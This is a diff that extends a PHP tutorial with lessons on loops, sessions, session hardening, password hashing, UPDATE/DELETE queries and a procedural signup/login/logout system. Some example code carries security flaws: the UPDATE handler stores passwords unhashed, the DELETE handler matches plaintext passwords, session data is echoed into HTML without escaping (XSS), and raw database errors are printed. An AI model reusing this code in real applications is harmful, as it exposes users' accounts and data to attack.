@@ -22,6 +22,14 @@
 12. [User-Defined Functions](#12--user-defined-functions)
 13. [Variable Scope](#13--variable-scope)
 14. [Constants](#14--constants)
+15. [Loops](#15--loops)
+16. [Sessions](#16--sessions)
+17. [Session Security](#17--session-security)
+18. [Password Hashing](#18--password-hashing)
+19. [UPDATE & DELETE via PHP](#19--update--delete-via-php)
+20. [Login System — Signup (Part 1)](#20--login-system--signup-part-1)
+21. [Login System — Login & Logout (Part 2)](#21--login-system--login--logout-part-2)
+22. [PHP Security — Complete Guide](#22--php-security--complete-guide)
 
 ---
 
@@ -1908,6 +1916,1664 @@ const DB_HOST = "localhost";
 
 ---
 
+## 15. 🔁 Loops
+
+### 15.1 `for` Loop
+
+| **Why**   | To repeat code a specific number of times — you know exactly how many iterations you need. |
+| --------- | ------------------------------------------------------------------------------------------ |
+| **How**   | `for (start; condition; increment)` — runs the block while the condition is true.          |
+| **Where** | Counting, iterating over indexes, repetitive tasks with a known range.                     |
+
+```php
+<?php
+for ($i = 0; $i <= 10; $i++) {
+    echo "Iteration number: " . $i . "<br>";
+}
+
+// Using a variable as the limit
+$test = 5;
+for ($i = 0; $i <= $test; $i++) {
+    echo "Iteration: " . $i . "<br>";
+}
+?>
+```
+
+**Anatomy of a `for` loop:**
+
+| Part        | Example  | Purpose                                    |
+| ----------- | -------- | ------------------------------------------ |
+| Start       | `$i = 0` | Runs once before the loop begins           |
+| Condition   | `$i <= 10` | Checked before each iteration; loop stops when `false` |
+| Increment   | `$i++`   | Runs after each iteration                  |
+
+---
+
+### 15.2 `while` Loop
+
+| **Why**   | To repeat code **as long as** a condition is true — use when you don't know the exact number of iterations upfront. |
+| --------- | ------------------------------------------------------------------------------------------------------------------- |
+| **How**   | `while (condition) { ... }` — checks the condition **before** each iteration.                                       |
+| **Where** | Reading files line by line, waiting for user input, processing until a flag changes.                                |
+
+```php
+<?php
+$boolean = true;
+while ($boolean) {
+    echo "While loop result: " . $boolean . "<br>";
+    $boolean = false;  // Without this, infinite loop!
+}
+
+$test = 5;
+while ($test < 10) {
+    echo $test . "<br>";
+    $test++;
+}
+?>
+```
+
+> **⚠️ Danger:** If the condition never becomes `false`, you get an **infinite loop** that crashes your server. Always make sure something inside the loop changes the condition.
+
+---
+
+### 15.3 `do...while` Loop
+
+| **Why**   | To execute the code block **at least once**, then repeat while the condition is true. |
+| --------- | ------------------------------------------------------------------------------------- |
+| **How**   | `do { ... } while (condition);` — checks the condition **after** each iteration.      |
+| **Where** | Menu prompts, input validation (run once, then check if valid).                       |
+
+```php
+<?php
+$test = 10;
+do {
+    echo "Do while result: " . $test . "<br>";
+    $test++;
+} while ($test < 10);
+// Output: "Do while result: 10"
+// Runs ONCE even though $test (10) is NOT < 10
+?>
+```
+
+| Loop Type    | Checks Condition | Minimum Runs |
+| ------------ | ---------------- | ------------ |
+| `while`      | **Before** body  | 0 times      |
+| `do...while` | **After** body   | **1 time**   |
+
+---
+
+### 15.4 `foreach` Loop
+
+| **Why**   | To iterate over **every element** in an array without needing to track indexes manually. The most common loop for arrays. |
+| --------- | ------------------------------------------------------------------------------------------------------------------------ |
+| **How**   | `foreach ($array as $value)` for indexed arrays, or `foreach ($array as $key => $value)` for associative arrays.          |
+| **Where** | Any time you need to process each element of an array.                                                                   |
+
+#### Indexed Array
+
+```php
+<?php
+$fruits = ["Apple", "Banana", "Orange"];
+
+foreach ($fruits as $fruit) {
+    echo "This is a " . $fruit . "<br>";
+}
+// Output: This is a Apple / This is a Banana / This is a Orange
+?>
+```
+
+#### Associative Array
+
+```php
+<?php
+$fruits = ["Apple" => "Red", "Banana" => "Yellow", "Orange" => "Orange"];
+
+foreach ($fruits as $fruit => $color) {
+    echo $fruit . " has a color of " . $color . "<br>";
+}
+// Output: Apple has a color of Red / Banana has a color of Yellow / ...
+?>
+```
+
+---
+
+### 15.5 Loops — Quick Summary
+
+| Loop         | Best For                             | Syntax                                    |
+| ------------ | ------------------------------------ | ----------------------------------------- |
+| `for`        | Known number of iterations           | `for ($i=0; $i<n; $i++) { }`              |
+| `while`      | Unknown iterations, check first      | `while (condition) { }`                   |
+| `do...while` | Must run at least once               | `do { } while (condition);`              |
+| `foreach`    | Iterating arrays (indexed or assoc.) | `foreach ($arr as $val) { }`              |
+
+> **💡 Pro Tip:** Use `foreach` for arrays — it's cleaner and prevents off-by-one errors. Use `for` when you need the index number.
+
+---
+
+## 16. 🔐 Sessions
+
+### 16.1 What Are Sessions?
+
+| **Why**   | HTTP is **stateless** — each page request is independent. Sessions let you **remember data** about a user across multiple page loads (e.g., "is this user logged in?"). |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **How**   | Call `session_start()` at the top of every page. Store data in `$_SESSION`. The data lives on the **server** and persists until the session is destroyed.                |
+| **Where** | Login systems, shopping carts, multi-step forms, user preferences.                                                                                                       |
+
+```php
+<?php
+// index.php
+session_start();                      // Must be called before ANY output
+$_SESSION["username"] = "Shimu";      // Store data in the session
+
+echo $_SESSION["username"];           // Output: Shimu
+?>
+```
+
+```php
+<?php
+// example.php (another page)
+session_start();                      // Resume the SAME session
+
+echo $_SESSION["username"];           // Output: Shimu (data persists!)
+?>
+```
+
+---
+
+### 16.2 Session Functions
+
+| Function            | What It Does                                                     |
+| ------------------- | ---------------------------------------------------------------- |
+| `session_start()`   | Starts a new session or resumes an existing one. **Must be first.** |
+| `unset($_SESSION["key"])` | Removes **one** specific session variable                  |
+| `session_unset()`   | Removes **all** session variables but keeps the session alive    |
+| `session_destroy()` | Destroys the session entirely — effect visible on **next** page load |
+
+```php
+<?php
+session_start();
+$_SESSION["username"] = "Shimu";
+$_SESSION["role"] = "admin";
+
+// Remove one variable
+unset($_SESSION["username"]);       // Only "role" remains
+
+// Remove all variables
+session_unset();                    // Session exists but is empty
+
+// Destroy the session completely
+session_destroy();                  // Session is gone on next page load
+?>
+```
+
+> **⚠️ Important:** `session_destroy()` does **not** take immediate effect on the current page. The `$_SESSION` array is still available until the script ends. The session is actually destroyed on the **next** request.
+
+### 16.3 Common Logout Pattern
+
+```php
+<?php
+session_start();
+session_unset();       // Clear all session data
+session_destroy();     // Destroy the session
+// User is now logged out (next page load won't have session data)
+?>
+```
+
+---
+
+## 17. 🛡️ Session Security
+
+### 17.1 Why Session Security Matters
+
+| **Why**   | Sessions store sensitive data (user ID, login status). Without proper configuration, attackers can **hijack** or **fix** sessions to impersonate users. |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **How**   | Configure session cookies, restrict how session IDs are accepted, and regenerate IDs periodically.                                                     |
+| **Where** | Every page that uses `session_start()` — always load your config file before starting the session.                                                     |
+
+---
+
+### 17.2 Session Configuration (`ini_set`)
+
+```php
+<?php
+ini_set('session.use_only_cookies', 1);
+ini_set('session.use_strict_mode', 1);
+?>
+```
+
+| Setting                  | Value | Purpose                                                                              |
+| ------------------------ | ----- | ------------------------------------------------------------------------------------ |
+| `use_only_cookies`       | `1`   | Only accept session IDs from **cookies** (not from URL parameters like `?PHPSESSID=…`) |
+| `use_strict_mode`        | `1`   | Reject **uninitialized** session IDs — if someone sends a made-up ID, PHP generates a new one |
+
+---
+
+### 17.3 Secure Cookie Parameters
+
+```php
+<?php
+session_set_cookie_params([
+    'lifetime' => 1800,       // 30 minutes
+    'domain'   => 'localhost',
+    'path'     => '/',
+    'secure'   => true,
+    'httponly'  => true
+]);
+
+session_start();
+?>
+```
+
+| Parameter  | Value         | Purpose                                                               |
+| ---------- | ------------- | --------------------------------------------------------------------- |
+| `lifetime` | `1800`        | Cookie expires after 30 minutes of inactivity                         |
+| `domain`   | `'localhost'` | Cookie only sent to this domain                                       |
+| `path`     | `'/'`         | Cookie available across the entire site                               |
+| `secure`   | `true`        | Cookie only sent over **HTTPS** (not plain HTTP)                      |
+| `httponly`  | `true`        | Cookie **cannot** be read by JavaScript — prevents XSS cookie theft   |
+
+---
+
+### 17.4 Session ID Regeneration
+
+| **Why**   | Prevents **session fixation attacks** — where an attacker sets a known session ID and waits for the victim to log in with it. |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| **How**   | Call `session_regenerate_id(true)` periodically. The `true` deletes the old session file.                                     |
+| **Where** | After login and on a timer (every 30 minutes).                                                                                |
+
+```php
+<?php
+session_start();
+
+if (!isset($_SESSION['last_regeneration'])) {
+    session_regenerate_id(true);
+    $_SESSION['last_regeneration'] = time();
+} else {
+    $interval = 60 * 30;  // 30 minutes
+    if (time() - $_SESSION['last_regeneration'] >= $interval) {
+        session_regenerate_id(true);
+        $_SESSION['last_regeneration'] = time();
+    }
+}
+?>
+```
+
+| Function                       | What It Does                                              |
+| ------------------------------ | --------------------------------------------------------- |
+| `session_regenerate_id(true)`  | Generates new session ID **and** deletes old session file |
+| `session_regenerate_id(false)` | Generates new ID but keeps old session (default)          |
+
+> **💡 Best Practice:** Regenerate the session ID on **every login** and every 30 minutes thereafter.
+
+---
+
+### 17.5 Session Security — Complete Config File
+
+```php
+<?php
+// config_session.inc.php — include this at the top of every page
+
+ini_set('session.use_only_cookies', 1);
+ini_set('session.use_strict_mode', 1);
+
+session_set_cookie_params([
+    'lifetime' => 1800,
+    'domain'   => 'localhost',
+    'path'     => '/',
+    'secure'   => true,
+    'httponly'  => true
+]);
+
+session_start();
+
+// Regenerate session ID every 30 minutes
+if (!isset($_SESSION['last_regeneration'])) {
+    session_regenerate_id(true);
+    $_SESSION['last_regeneration'] = time();
+} else {
+    $interval = 60 * 30;
+    if (time() - $_SESSION['last_regeneration'] >= $interval) {
+        session_regenerate_id(true);
+        $_SESSION['last_regeneration'] = time();
+    }
+}
+?>
+```
+
+> **💡 Usage:** `require "config_session.inc.php";` at the top of every page that needs sessions. This replaces a bare `session_start()` call.
+
+---
+
+## 18. 🔑 Password Hashing
+
+### 18.1 Why Hash Passwords?
+
+| **Why**   | If your database is ever hacked, stored passwords are exposed. **Hashing** converts passwords into unreadable strings, so even if leaked, they can't be reversed. |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **How**   | Use `password_hash()` to hash and `password_verify()` to check. **Never** store plaintext passwords.                                                              |
+| **Where** | Signup (hash before storing) and Login (verify against stored hash).                                                                                              |
+
+---
+
+### 18.2 `password_hash()` — Hashing a Password
+
+```php
+<?php
+$plainPassword = "Violet";
+
+$options = [
+    'cost' => 12    // 2^12 = 4096 iterations — higher = slower but more secure
+];
+
+$hashedPwd = password_hash($plainPassword, PASSWORD_BCRYPT, $options);
+
+echo $hashedPwd;
+// Output: $2y$12$randomsaltandhashedstringhere (60 chars)
+?>
+```
+
+| Parameter          | What It Does                                                         |
+| ------------------ | -------------------------------------------------------------------- |
+| `$plainPassword`   | The user's raw password                                              |
+| `PASSWORD_BCRYPT`  | The hashing algorithm (bcrypt)                                       |
+| `PASSWORD_DEFAULT` | Uses the best algorithm available (currently bcrypt, may change)     |
+| `'cost' => 12`     | How many times the hash is computed (2^12). Higher = slower & safer  |
+
+> **💡 Pro Tip:** `PASSWORD_DEFAULT` is recommended over `PASSWORD_BCRYPT` because it auto-updates when PHP adds better algorithms. Use `pwd VARCHAR(255)` in your database to accommodate any future algorithm.
+
+---
+
+### 18.3 `password_verify()` — Checking a Password
+
+```php
+<?php
+$loginPassword = "Violet";
+$storedHash = "$2y$12$...";  // Retrieved from database
+
+if (password_verify($loginPassword, $storedHash)) {
+    echo "Passwords match!";
+} else {
+    echo "Wrong password!";
+}
+?>
+```
+
+- `password_verify()` extracts the salt and cost from the stored hash automatically.
+- You do **not** need to hash the login password yourself — `password_verify()` handles it.
+
+---
+
+### 18.4 Hashing in a Real Signup Handler
+
+```php
+<?php
+// formhandler.php — hash BEFORE inserting into database
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $pwd = $_POST["pwd"];
+    $email = $_POST["email"];
+
+    try {
+        require_once "../../20-connect-db/includes/dbh.inc.php";
+
+        $query = "INSERT INTO users (username, pwd, email) VALUES (:username, :pwd, :email);";
+        $stmt = $pdo->prepare($query);
+
+        $options = ['cost' => 12];
+        $hashedPwd = password_hash($pwd, PASSWORD_BCRYPT, $options);
+
+        $stmt->bindParam(":username", $username);
+        $stmt->bindParam(":pwd", $hashedPwd);   // ← Hashed, not plain!
+        $stmt->bindParam(":email", $email);
+        $stmt->execute();
+
+        header("Location: ../form.php");
+        die();
+    } catch (PDOException $e) {
+        die("Query failed: " . $e->getMessage());
+    }
+}
+?>
+```
+
+---
+
+### 18.5 General-Purpose Hashing (SHA-256 with Salt & Pepper)
+
+For non-password data (API tokens, verification codes), you can use `hash()` with salt and pepper:
+
+```php
+<?php
+$data = "Violet";
+$salt = bin2hex(random_bytes(16));    // Random salt — stored alongside the hash
+$pepper = "ASecretPepperString";      // Pepper — stored in code/env (not in DB)
+
+$dataToHash = $data . $salt . $pepper;
+$hash = hash("sha256", $dataToHash);
+
+// To verify later:
+$verificationHash = hash("sha256", $data . $salt . $pepper);
+if ($hash === $verificationHash) {
+    echo "Match!";
+}
+?>
+```
+
+| Term       | What It Is                                    | Where Stored    |
+| ---------- | --------------------------------------------- | --------------- |
+| **Salt**   | Random string added to make each hash unique  | In the database |
+| **Pepper** | Secret string known only to the application   | In code or `.env` |
+| **Hash**   | The resulting one-way encrypted string         | In the database |
+
+> **⚠️ For passwords, always use `password_hash()` + `password_verify()`.** The `hash()` + salt/pepper approach above is for general-purpose hashing only.
+
+---
+
+### 18.6 Hashing — Quick Reference
+
+| Function                     | Purpose                                  | Use For         |
+| ---------------------------- | ---------------------------------------- | --------------- |
+| `password_hash($pwd, algo)`  | Hash a password securely                 | Signup          |
+| `password_verify($pwd, $hash)` | Check password against stored hash    | Login           |
+| `hash("sha256", $data)`      | General one-way hash                     | Tokens, checksums |
+| `bin2hex(random_bytes(16))`  | Generate random salt                     | Salt generation |
+
+---
+
+## 19. ✏️ UPDATE & DELETE via PHP
+
+### 19.1 Updating Database Records
+
+| **Why**   | Users need to change their account details (username, password, email, etc.).                       |
+| --------- | -------------------------------------------------------------------------------------------------- |
+| **How**   | Use a `UPDATE` SQL query with prepared statements. Form submits to a PHP handler that runs the query. |
+| **Where** | Account settings pages, admin panels, any "edit" form.                                              |
+
+```php
+<?php
+// userupdate.inc.php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $pwd = $_POST["pwd"];
+    $email = $_POST["email"];
+
+    try {
+        require_once "../../20-connect-db/includes/dbh.inc.php";
+
+        $query = "UPDATE users SET username = :username, pwd = :pwd, email = :email WHERE id = 2;";
+
+        $stmt = $pdo->prepare($query);
+        $stmt->bindParam(":username", $username);
+        $stmt->bindParam(":pwd", $pwd);
+        $stmt->bindParam(":email", $email);
+        $stmt->execute();
+
+        $pdo = null;
+        $stmt = null;
+
+        header("Location: ../form.php");
+        die();
+    } catch (PDOException $e) {
+        die("Query failed: " . $e->getMessage());
+    }
+} else {
+    header("Location: ../form.php");
+}
+?>
+```
+
+**Key parts of the `UPDATE` query:**
+
+| Part | Purpose |
+|:---|:---|
+| `UPDATE users` | Which table to update |
+| `SET col = :val` | Which columns to change and their new values |
+| `WHERE id = 2` | Which row(s) to update — **always include WHERE** |
+
+> **⚠️ CRITICAL:** Never omit the `WHERE` clause in an `UPDATE` query. Without it, **every row** in the table gets updated!
+
+---
+
+### 19.2 Deleting Database Records
+
+| **Why**   | Users may want to delete their account, or admins may need to remove records.        |
+| --------- | ------------------------------------------------------------------------------------ |
+| **How**   | Use a `DELETE FROM` SQL query with prepared statements and a `WHERE` clause.          |
+| **Where** | Account deletion, cleanup scripts, admin panels.                                     |
+
+```php
+<?php
+// userdelete.inc.php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $pwd = $_POST["pwd"];
+
+    try {
+        require_once "../../20-connect-db/includes/dbh.inc.php";
+
+        $query = "DELETE FROM users WHERE username = :username AND pwd = :pwd;";
+
+        $stmt = $pdo->prepare($query);
+        $stmt->bindParam(":username", $username);
+        $stmt->bindParam(":pwd", $pwd);
+        $stmt->execute();
+
+        $pdo = null;
+        $stmt = null;
+
+        header("Location: ../form.php");
+        die();
+    } catch (PDOException $e) {
+        die("Query failed: " . $e->getMessage());
+    }
+} else {
+    header("Location: ../form.php");
+}
+?>
+```
+
+> **⚠️ CRITICAL:** Never omit the `WHERE` clause in a `DELETE` query. Without it, **every row** in the table gets deleted!
+
+---
+
+### 19.3 The Form (UPDATE & DELETE on Same Page)
+
+```php
+<body>
+    <h3>Change account</h3>
+    <form action="includes/userupdate.inc.php" method="post">
+        <input type="text" name="username" placeholder="Username">
+        <input type="password" name="pwd" placeholder="Password">
+        <input type="text" name="email" placeholder="E-Mail">
+        <button>Update</button>
+    </form>
+
+    <h3>Delete account</h3>
+    <form action="includes/userdelete.inc.php" method="post">
+        <input type="text" name="username" placeholder="Username">
+        <input type="password" name="pwd" placeholder="Password">
+        <button>Delete</button>
+    </form>
+</body>
+```
+
+---
+
+### 19.4 CRUD Summary (All 4 Operations)
+
+| Operation  | SQL         | PHP Method                      | Lesson |
+| ---------- | ----------- | ------------------------------- | ------ |
+| **C**reate | `INSERT INTO` | `$pdo->prepare()` + `execute()` | 22     |
+| **R**ead   | `SELECT`      | `$stmt->fetchAll()` or `fetch()` | 24    |
+| **U**pdate | `UPDATE SET`  | `$pdo->prepare()` + `execute()` | 23     |
+| **D**elete | `DELETE FROM` | `$pdo->prepare()` + `execute()` | 23     |
+
+> **All four operations must use prepared statements** to prevent SQL injection.
+
+---
+
+## 20. 🏗️ Login System — Signup (Part 1)
+
+### 20.1 Overview & Architecture
+
+| **Why**   | A signup/login system is the foundation of almost every web application — user accounts, personalization, access control. |
+| --------- | ------------------------------------------------------------------------------------------------------------------------ |
+| **How**   | Procedural PHP with a **MVC-like pattern**: separate files for Model (DB), View (display), Controller (validation).       |
+| **Where** | The `28-login-system-p1/` and `29-login-system-p2/` folders.                                                              |
+
+#### Project Structure (Part 1)
+
+```
+28-login-system-p1/
+├── index.php                    ← Main page (Login & Signup forms)
+├── db.sql                       ← SQL to create the users table
+└── includes/
+    ├── dbh.inc.php              ← Database connection (PDO)
+    ├── config_session.inc.php   ← Session config & security
+    ├── signup.inc.php           ← Signup handler (coordinator)
+    ├── signup_contr.inc.php     ← Signup controller (validation)
+    ├── signup_model.inc.php     ← Signup model (DB queries)
+    ├── signup_view.inc.php      ← Signup view (form inputs & errors)
+    └── login.inc.php            ← Login handler (empty in Part 1)
+```
+
+#### The MVC Pattern
+
+```
+┌──────────────┬──────────────┬──────────────────┐
+│    MODEL     │     VIEW     │    CONTROLLER    │
+│              │              │                  │
+│ DB queries   │ HTML output  │ Validation &     │
+│              │ & display    │ business logic   │
+│              │              │                  │
+│ signup_      │ signup_      │ signup_          │
+│ model.inc    │ view.inc     │ contr.inc        │
+│ .php         │ .php         │ .php             │
+└──────────────┴──────────────┴──────────────────┘
+```
+
+| Layer          | File                   | Responsibility                                   |
+| -------------- | ---------------------- | ------------------------------------------------ |
+| **Model**      | `signup_model.inc.php` | Database queries (SELECT, INSERT)                |
+| **View**       | `signup_view.inc.php`  | HTML output (form inputs, error messages)        |
+| **Controller** | `signup_contr.inc.php` | Validation, business logic (empty? valid email?) |
+| **Coordinator** | `signup.inc.php`      | Ties M, V, C together; handles the request flow  |
+
+> **Why MVC?** Each file has **one job**. If there's a DB bug, look in Model. Display bug? Look in View. Separation makes code easier to debug and maintain.
+
+---
+
+### 20.2 Database Table
+
+```sql
+CREATE TABLE users (
+    id INT(11) NOT NULL AUTO_INCREMENT,
+    username VARCHAR(30) NOT NULL,
+    pwd VARCHAR(255) NOT NULL,
+    email VARCHAR(100) NOT NULL,
+    created_at DATETIME NOT NULL DEFAULT CURRENT_TIME,
+    PRIMARY KEY (id)
+);
+```
+
+> `pwd` is `VARCHAR(255)` because `password_hash()` outputs ~60 chars for bcrypt, but 255 accommodates future algorithm changes.
+
+---
+
+### 20.3 Signup Flow (Step by Step)
+
+```
+User fills form → POST to signup.inc.php
+    ↓
+Grab $_POST data (username, pwd, email)
+    ↓
+Require Model, View, Controller files
+    ↓
+Validate:
+  ├── Input empty?        → $errors["empty_input"]
+  ├── Email invalid?      → $errors["invalid_email"]
+  ├── Username taken? (DB)→ $errors["username_taken"]
+  └── Email registered? (DB)→ $errors["email_used"]
+    ↓
+Errors exist?
+  ├── YES → Store errors + form data in $_SESSION → redirect → display errors
+  └── NO  → Hash password → INSERT into DB → redirect with ?signup=success
+```
+
+---
+
+### 20.4 Controller Functions (`signup_contr.inc.php`)
+
+All use `declare(strict_types=1)` for type safety.
+
+```php
+<?php
+declare(strict_types=1);
+
+function is_input_empty(string $username, string $pwd, string $email) {
+    return empty($username) || empty($pwd) || empty($email);
+}
+
+function is_email_invalid(string $email) {
+    return !filter_var($email, FILTER_VALIDATE_EMAIL);
+}
+
+function is_username_taken(object $pdo, string $username) {
+    return (bool) get_username($pdo, $username);  // Calls Model
+}
+
+function is_email_registered(object $pdo, string $email) {
+    return (bool) get_email($pdo, $email);        // Calls Model
+}
+?>
+```
+
+| Function              | Checks                                            | Calls         |
+| --------------------- | ------------------------------------------------- | ------------- |
+| `is_input_empty()`    | Are any fields blank?                             | `empty()`     |
+| `is_email_invalid()`  | Is the email format wrong?                        | `filter_var()` |
+| `is_username_taken()` | Does the username already exist in DB?            | Model         |
+| `is_email_registered()` | Does the email already exist in DB?             | Model         |
+
+---
+
+### 20.5 Model Functions (`signup_model.inc.php`)
+
+```php
+<?php
+declare(strict_types=1);
+
+function get_username(object $pdo, string $username) {
+    $query = "SELECT username FROM users WHERE username = :username";
+    $stmt = $pdo->prepare($query);
+    $stmt->bindParam(":username", $username);
+    $stmt->execute();
+    return $stmt->fetch(PDO::FETCH_ASSOC);  // Returns array or false
+}
+
+function get_email(object $pdo, string $email) {
+    $query = "SELECT email FROM users WHERE email = :email";
+    $stmt = $pdo->prepare($query);
+    $stmt->bindParam(":email", $email);
+    $stmt->execute();
+    return $stmt->fetch(PDO::FETCH_ASSOC);
+}
+
+function set_user(object $pdo, string $pwd, string $username, string $email) {
+    $query = "INSERT INTO users (username, pwd, email) VALUES (:username, :pwd, :email);";
+    $stmt = $pdo->prepare($query);
+
+    $options = ['cost' => 12];
+    $hashedPwd = password_hash($pwd, PASSWORD_BCRYPT, $options);
+
+    $stmt->bindParam(":username", $username);
+    $stmt->bindParam(":pwd", $hashedPwd);
+    $stmt->bindParam(":email", $email);
+    $stmt->execute();
+}
+?>
+```
+
+> **Key:** The model is the **only layer** that touches the database. Controller and View never write SQL.
+
+---
+
+### 20.6 View Functions (`signup_view.inc.php`)
+
+#### Pre-filling Form Inputs After Errors
+
+```php
+<?php
+function signup_inputs() {
+    // Pre-fill username (unless username was the error)
+    if (isset($_SESSION["signup_data"]["username"]) && !isset($_SESSION["errors_signup"]["username_taken"])) {
+        echo '<input type="text" name="username" value="' . $_SESSION["signup_data"]["username"] . '">';
+    } else {
+        echo '<input type="text" name="username" placeholder="Username">';
+    }
+
+    // Password is NEVER pre-filled (security)
+    echo '<input type="password" name="pwd" placeholder="Password">';
+
+    // Pre-fill email (unless email was the error)
+    if (isset($_SESSION["signup_data"]["email"])
+        && !isset($_SESSION["errors_signup"]["email_used"])
+        && !isset($_SESSION["errors_signup"]["invalid_email"])) {
+        echo '<input type="text" name="email" value="' . $_SESSION["signup_data"]["email"] . '">';
+    } else {
+        echo '<input type="text" name="email" placeholder="E-Mail">';
+    }
+}
+?>
+```
+
+> **Why pre-fill?** Better UX — user doesn't re-type everything. Only the **problematic field** is cleared.
+
+#### Displaying Errors & Success
+
+```php
+<?php
+function check_signup_errors() {
+    if (isset($_SESSION["errors_signup"])) {
+        $errors = $_SESSION["errors_signup"];
+        foreach ($errors as $error) {
+            echo '<p>' . $error . '</p>';
+        }
+        unset($_SESSION["errors_signup"]);   // Clear after display (flash message)
+    } else if (isset($_GET["signup"]) && $_GET["signup"] === "success") {
+        echo "<p>SIGNUP SUCCESS!!!</p>";
+    }
+}
+?>
+```
+
+- Errors stored in `$_SESSION` → displayed once → `unset()` clears them (flash messages).
+- Success detected via `$_GET["signup"]` query parameter in URL.
+
+---
+
+### 20.7 Key Built-in Functions (Part 1)
+
+| Function                      | Purpose                                            |
+| ----------------------------- | -------------------------------------------------- |
+| `filter_var($val, FILTER_VALIDATE_EMAIL)` | Validates email format               |
+| `password_hash($pwd, algo)`  | Hashes a password with bcrypt                      |
+| `empty($var)`                 | Returns `true` if empty (`""`, `0`, `null`, etc.)  |
+| `isset($var)`                 | Returns `true` if set and not `null`               |
+| `unset($var)`                 | Destroys a variable                                |
+| `session_start()`             | Starts/resumes a session                           |
+| `session_regenerate_id(true)` | Regenerates session ID (prevents fixation)         |
+| `header("Location: ...")`    | HTTP redirect                                      |
+| `die()` / `exit()`           | Stops script execution                             |
+
+---
+
+## 21. 🔐 Login System — Login & Logout (Part 2)
+
+### 21.1 What's Added in Part 2
+
+| Feature              | New Files                                                                    |
+| -------------------- | ---------------------------------------------------------------------------- |
+| **Login**            | `login.inc.php`, `login_contr.inc.php`, `login_model.inc.php`, `login_view.inc.php` |
+| **Logout**           | `logout.inc.php`                                                             |
+| **Conditional UI**   | `index.php` — hides login form when user is already logged in                |
+
+---
+
+### 21.2 Login Flow (Step by Step)
+
+```
+User fills login form → POST to login.inc.php
+    ↓
+Grab $_POST["username"], $_POST["pwd"]
+    ↓
+Require Model, Controller, View files
+    ↓
+Validate:
+  ├── Input empty?         → $errors["empty_input"]
+  ├── Username not found?  → $errors["login_incorrect"]
+  └── Password doesn't match hash? → $errors["login_incorrect"]
+    ↓
+Errors exist?
+  ├── YES → Store in $_SESSION → redirect → display errors
+  └── NO  → Set session vars (user_id, user_username) → redirect with ?login=success
+```
+
+---
+
+### 21.3 Login Controller (`login_contr.inc.php`)
+
+```php
+<?php
+declare(strict_types=1);
+
+function is_input_empty(string $username, string $pwd) {
+    return empty($username) || empty($pwd);
+}
+
+function is_username_wrong(bool|array $result) {
+    return !$result;   // false = user not found
+}
+
+function is_password_wrong(string $pwd, string $hashPwd) {
+    return !password_verify($pwd, $hashPwd);
+}
+?>
+```
+
+| Function              | What It Checks                                      |
+| --------------------- | --------------------------------------------------- |
+| `is_input_empty()`    | Are fields blank?                                   |
+| `is_username_wrong()` | DB returned `false` (user not found)                |
+| `is_password_wrong()` | `password_verify()` returned `false` (wrong password) |
+
+> **Union Type:** `bool|array $result` — because `PDO::fetch()` returns `false` (bool) when no row is found, or an associative array when found.
+
+---
+
+### 21.4 Login Model (`login_model.inc.php`)
+
+```php
+<?php
+declare(strict_types=1);
+
+function get_user(object $pdo, string $username) {
+    $query = "SELECT * FROM users WHERE username = :username";
+    $stmt = $pdo->prepare($query);
+    $stmt->bindParam(":username", $username);
+    $stmt->execute();
+    return $stmt->fetch(PDO::FETCH_ASSOC);
+}
+?>
+```
+
+- Uses `SELECT *` to fetch the **entire** user row (id, username, pwd hash, email, etc.).
+- Returns `false` if user doesn't exist.
+
+---
+
+### 21.5 Login Handler — Setting Session Variables
+
+On successful login, `login.inc.php` sets:
+
+```php
+<?php
+$_SESSION["user_id"] = $result["id"];
+$_SESSION["user_username"] = htmlspecialchars($result["username"]);
+$_SESSION["last_regeneration"] = time();
+?>
+```
+
+| Session Variable         | Purpose                                                |
+| ------------------------ | ------------------------------------------------------ |
+| `user_id`                | Unique user identifier — used to check "is user logged in?" |
+| `user_username`          | Display name (sanitized with `htmlspecialchars()`)     |
+| `last_regeneration`      | Timestamp for session ID regeneration timer            |
+
+---
+
+### 21.6 Login View (`login_view.inc.php`)
+
+```php
+<?php
+declare(strict_types=1);
+
+function output_username() {
+    if (isset($_SESSION["user_id"])) {
+        echo "You are logged in as " . $_SESSION["user_username"];
+    } else {
+        echo "You are not logged in.";
+    }
+}
+
+function check_login_errors() {
+    if (isset($_SESSION["errors_login"])) {
+        $errors = $_SESSION["errors_login"];
+        foreach ($errors as $error) {
+            echo "<p>" . $error . "</p>";
+        }
+        unset($_SESSION["errors_login"]);
+    } else if (isset($_GET["login"]) && $_GET["login"] === "success") {
+        echo "<p>LOGIN SUCCESS!!!</p>";
+    }
+}
+?>
+```
+
+---
+
+### 21.7 Conditional Login Form (Show/Hide)
+
+```php
+<?php if (!isset($_SESSION["user_id"])) { ?>
+    <h3>Login</h3>
+    <form action="includes/login.inc.php" method="post">
+        <input type="text" name="username" placeholder="Username">
+        <input type="password" name="pwd" placeholder="Password">
+        <button>Login</button>
+    </form>
+<?php } ?>
+```
+
+- Login form **disappears** after the user logs in because `$_SESSION["user_id"]` is now set.
+- This is the **close/open PHP tags around HTML** pattern from earlier.
+
+---
+
+### 21.8 Logout Handler (`logout.inc.php`)
+
+```php
+<?php
+// Must use the SAME cookie params as config_session.inc.php
+ini_set('session.use_only_cookies', 1);
+ini_set('session.use_strict_mode', 1);
+
+session_set_cookie_params([
+    'lifetime' => 1800,
+    'domain'   => 'localhost',
+    'path'     => '/',
+    'secure'   => true,
+    'httponly'  => true
+]);
+
+session_start();
+session_unset();      // Clear all session variables
+session_destroy();    // Destroy the session on the server
+
+// Delete the session cookie from the browser
+setcookie(session_name(), '', time() - 3600, '/', 'localhost', true, true);
+
+header("Location: ../index.php");
+die();
+?>
+```
+
+| Step | Code | Purpose |
+|:---|:---|:---|
+| 1 | Same `session_set_cookie_params()` | Must match the params used to create the session |
+| 2 | `session_start()` | Resume the existing session |
+| 3 | `session_unset()` | Clear all `$_SESSION` data |
+| 4 | `session_destroy()` | Destroy the session on the server |
+| 5 | `setcookie(... time()-3600 ...)` | Tell the browser to delete the cookie (past expiry) |
+| 6 | Redirect + `die()` | Send user to index page |
+
